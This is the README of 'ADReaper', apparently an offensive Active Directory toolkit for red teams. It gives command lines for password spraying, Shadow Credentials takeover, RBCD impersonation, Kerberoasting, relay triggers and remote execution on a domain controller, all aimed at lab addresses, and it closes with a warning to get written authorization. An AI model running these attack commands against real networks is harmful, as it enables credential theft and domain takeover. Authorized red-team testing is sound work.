# 💀 ADREAPER: Ultimate Active Directory Recon & Attack Toolkit ⚔️

```text
 █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                              @adreaper v3.2.0
```

**ADReaper** is a high-performance, multi-threaded Active Directory reconnaissance and attack orchestration toolkit. It is designed to be the "Swiss Army Knife" for Red Teams, providing a unified interface for discovery, exploitation, and reporting.

---

## 🚀 Core Capabilities

### 🔍 Intelligence & Recon (Phase 1)
- **Multi-Threaded Port Scanning**: High-speed discovery with service fingerprinting.
- **LDAP Deep Enumeration**: Automated extraction of Users, Groups, OUs, and GPOs.
- **Global SMB Mapping**: Recursive tree visualization of the entire domain's file shares.
- **DNS Service Discovery**: Identification of internal infrastructure via SRV and A records.

### 🩸 BloodHound Integration (Phase 2)
ADReaper features a native **BloodHound Collector** that generates SharpHound-compatible JSON files for advanced graph analysis.
- **Full Object Collection**: Users, Groups, Computers, and Containers.
- **ACL Telemetry**: Real-time extraction of Security Descriptors to identify attack paths.
- **Neo4j Direct Ingestion**: Push collected data directly into your BloodHound Neo4j database.

### ⚔️ Tactical Exploitation (Phase 3)
- **Shadow Credentials**: Passwordless takeover via `msDS-KeyCredentialLink`.
- **RBCD Automation**: Orchestrated Resource-Based Constrained Delegation.
- **Credential Roasting**: High-speed Kerberoasting and ASREPRoasting.
- **Relay Triggers**: Built-in PetitPotam and PrinterBug exploit engines.
- **GPP Decryption**: Recover passwords from Group Policy Preferences.

### 🌌 Universal Remote Execution (Phase 4)
- **Authentic Protocol Relay**: Real command execution via SMB/RPC (No simulation).
- **Real-Time Stream Capture**: Direct polling of remote STDOUT/STDERR.
- **Zero-Footprint Cleanup**: Automatic removal of all remote artifacts.

---

## 🛠️ Usage Guide

### 📋 Global Options
| Flag | Shorthand | Description |
| :--- | :--- | :--- |
| `--domain` | `-d` | Target AD Domain (lab.local) |
| `--username` | `-u` | Authentication Username |
| `--password` | `-p` | Authentication Password |
| `--dc-ip` | | IP of the Domain Controller |
| `--output` | `-o` | Workspace directory (Default: ./workspace) |
| `--verbose` | `-v` | Enable detailed debug logging |

### 🔍 Enumeration & Recon Examples
```powershell
# Fingerprint the domain and password policy
.\adreaper.exe enum domain -d lab.local --dc-ip 192.168.3.10

# Scan infrastructure (All ports, No-ping)
.\adreaper.exe infra scan -t 192.168.3.10 --ports all -Pn

# Map the entire SMB tree of a target
.\adreaper.exe enum tree -d lab.local -u user -p pass -s "C$" --depth 3
```

### 🩸 BloodHound Operations
```powershell
# Collect all domain data for BloodHound
.\adreaper.exe bloodhound collect -d lab.local --dc-ip 192.168.3.10 -u admin -p pass

# Ingest data directly into Neo4j
.\adreaper.exe bloodhound ingest --neo4j-uri bolt://127.0.0.1:7687 --neo4j-pass mypassword
```

### ⚔️ Attack & Exploitation Examples
```powershell
# Password Spraying (Stealthy Throttling)
.\adreaper.exe attack spray -U users.txt -P "Password123!" -d lab.local --delay 5

# Shadow Credentials Takeover
.\adreaper.exe attack shadow -t SERVER01 -u user -p pass -d lab.local

# RBCD Impersonation
.\adreaper.exe attack rbcd -t DC01 -M ATTACK_HOST$ -u admin -p pass

# Kerberoast SPN Accounts
.\adreaper.exe attack kerberoast -d lab.local -u user -p pass -o hashes.txt
```

### 🌌 Authentic Remote Execution
```powershell
# Execute 'whoami /all' on a remote DC
.\adreaper.exe "whoami /all" -d lab.local -u administrator -p Pass123 --dc-ip 192.168.3.10

# Run 'systeminfo' and capture the real output
.\adreaper.exe "systeminfo" -d lab.local -u admin -p pass
```

---

## 🏗️ Technical Architecture
ADReaper is built with a modular approach for maximum stability:
- **`cmd/`**: Cobra-based CLI interface with smart command proxying.
- **`internal/recon/`**: Low-level protocol implementation (LDAP, SMB, DNS).
- **`internal/attacks/`**: Weaponized modules with built-in safety checks.
- **`internal/output/`**: High-performance reporting (Console, JSON, Premium HTML).

---

## ⚠️ Tactical Warning
This toolkit is designed for professional Red Team engagements. The use of remote execution modules and relay triggers against production servers should be done with extreme care. Always ensure you have written authorization before testing.

---
**Developed with ❤️ and ⚔️ for the Global Red Team Community.**
